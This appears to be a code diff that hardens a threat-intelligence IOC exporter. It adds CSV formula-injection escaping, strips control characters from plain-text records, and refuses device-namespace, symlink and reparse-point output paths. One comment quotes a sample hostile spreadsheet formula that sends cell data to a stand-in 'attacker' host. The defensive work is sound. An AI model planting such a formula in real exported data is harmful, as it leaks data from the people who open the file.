@@ -1010,10 +1010,24 @@ void CSVExportWriter::WriteEscapedField(std::string_view field) {
         field = field.substr(0, kMaxFieldSize);
     }
     
+    // TITANIUM: Defeat CSV formula injection (CWE-1236). Spreadsheet
+    // applications (Excel, LibreOffice, Google Sheets) interpret a field
+    // that begins with =, +, -, @, TAB, or CR as a formula expression.
+    // An IOC value supplied by a hostile feed - e.g. an indicator string
+    // like "=HYPERLINK(\"http://attacker/?x=\"&A1,\"click\")" - would
+    // therefore execute when an operator opens the exported CSV. Prefix
+    // any such field with an apostrophe inside the quoted form so the
+    // spreadsheet treats the content as literal text.
+    const bool injectionPrefix =
+        !field.empty() &&
+        (field.front() == '=' || field.front() == '+' ||
+         field.front() == '-' || field.front() == '@' ||
+         field.front() == '\t' || field.front() == '\r');
+    
     // Check if escaping is needed
-    bool needsQuotes = false;
+    bool needsQuotes = injectionPrefix;
     for (char c : field) {
-        if (c == m_options.csvDelimiter || c == m_options.csvQuote || 
+        if (c == m_options.csvDelimiter || c == m_options.csvQuote ||
             c == '\n' || c == '\r') {
             needsQuotes = true;
             break;
@@ -1025,14 +1039,21 @@ void CSVExportWriter::WriteEscapedField(std::string_view field) {
         return;
     }
     
-    // Pre-reserve space for worst case (all quotes doubled + surrounding quotes)
-    const size_t worstCase = field.size() * 2 + 2;
+    // Pre-reserve space for worst case (all quotes doubled + surrounding quotes + injection prefix)
+    const size_t worstCase = field.size() * 2 + 3;
     if (m_buffer.capacity() - m_buffer.size() < worstCase) {
         m_buffer.reserve(m_buffer.size() + worstCase);
     }
     
     // Escape with quotes
     m_buffer += m_options.csvQuote;
+    if (injectionPrefix) {
+        // Inserting a single apostrophe before the leading sentinel
+        // neutralises formula evaluation in all major spreadsheet
+        // applications while remaining a no-op for non-spreadsheet
+        // CSV parsers (the apostrophe is part of the quoted field).
+        m_buffer += '\'';
+    }
     for (char c : field) {
         if (c == m_options.csvQuote) {
             m_buffer += m_options.csvQuote;  // Double the quote
@@ -2249,6 +2270,20 @@ std::string PlainTextExportWriter::FormatIOCValue(
 bool PlainTextExportWriter::WriteEntry(const IOCEntry& entry, const IStringPoolReader* stringPool) {
     std::string value = FormatIOCValue(entry, stringPool);
     
+    // TITANIUM: PlainText is a one-IOC-per-line format. If a hostile feed
+    // smuggles CR or LF (or NUL) into a value (e.g. a malformed URL or a
+    // string-pool entry crafted by an attacker), downstream parsers see
+    // two records where there should be one, allowing forgery of new IOCs
+    // in any consumer that ingests this file. Replace control characters
+    // with U+0020 so a single record is always emitted per line.
+    for (char& ch : value) {
+        const unsigned char uc = static_cast<unsigned char>(ch);
+        if (uc == '\r' || uc == '\n' || uc == '\0' ||
+            (uc < 32 && uc != '\t')) {
+            ch = ' ';
+        }
+    }
+    
     m_output << value;
     if (m_options.windowsNewlines) {
         m_output << "\r\n";
@@ -2506,6 +2541,74 @@ ExportResult ThreatIntelExporter::ExportToFile(
     result.outputPath = outputPath;
     result.format = options.format;
     result.compression = options.compression;
+    
+    // TITANIUM: Reject empty paths up front - std::ofstream silently fails.
+    if (outputPath.empty()) {
+        result.success = false;
+        result.errorMessage = "Output path is empty";
+        return result;
+    }
+    
+    // TITANIUM: Refuse Windows device-namespace prefixes that bypass the
+    // normal filesystem (\\.\PhysicalDrive0, \\.\PIPE\..., \\?\GLOBALROOT,
+    // \\?\Volume{...}). Exporters must never write to raw devices or NT
+    // object-manager paths, even under operator misconfiguration.
+    {
+        const std::wstring_view pv{outputPath};
+        if (pv.starts_with(L"\\\\.\\") ||
+            pv.starts_with(L"\\\\?\\GLOBALROOT") ||
+            pv.starts_with(L"\\\\?\\Volume{") ||
+            pv.starts_with(L"\\??\\")) {
+            result.success = false;
+            result.errorMessage = "Output path targets a device namespace";
+            return result;
+        }
+        // Reject embedded NULs / control characters which can produce
+        // surprising downstream parses when the wstring is later logged
+        // or echoed.
+        for (wchar_t wc : pv) {
+            if (wc == L'\0' || (wc > 0 && wc < 32)) {
+                result.success = false;
+                result.errorMessage = "Output path contains control character";
+                return result;
+            }
+        }
+    }
+    
+    // TITANIUM: Symlink / reparse-point protection. If a file already
+    // exists at the target and it is a symlink, junction, or other reparse
+    // point, refuse the write. Following an attacker-placed reparse point
+    // would let an unprivileged user redirect an export into a privileged
+    // location, or (in appendMode) corrupt arbitrary files.
+    try {
+        std::error_code ec;
+        const std::filesystem::path fsPath(outputPath);
+        const auto sym = std::filesystem::symlink_status(fsPath, ec);
+        if (!ec && std::filesystem::exists(sym)) {
+            if (std::filesystem::is_symlink(sym)) {
+                result.success = false;
+                result.errorMessage = "Output path is a symbolic link";
+                return result;
+            }
+            // Detect non-symlink reparse points (Windows junctions, mount
+            // points) which symlink_status does not always classify as
+            // symlinks.
+            const auto perms = sym.permissions();
+            (void)perms;
+            const DWORD attrs = ::GetFileAttributesW(outputPath.c_str());
+            if (attrs != INVALID_FILE_ATTRIBUTES &&
+                (attrs & FILE_ATTRIBUTE_REPARSE_POINT)) {
+                result.success = false;
+                result.errorMessage = "Output path is a reparse point";
+                return result;
+            }
+        }
+    } catch (const std::exception& e) {
+        result.success = false;
+        result.errorMessage = "Failed to inspect output path: ";
+        result.errorMessage += e.what();
+        return result;
+    }
     
     // Create output directory if needed
     try {
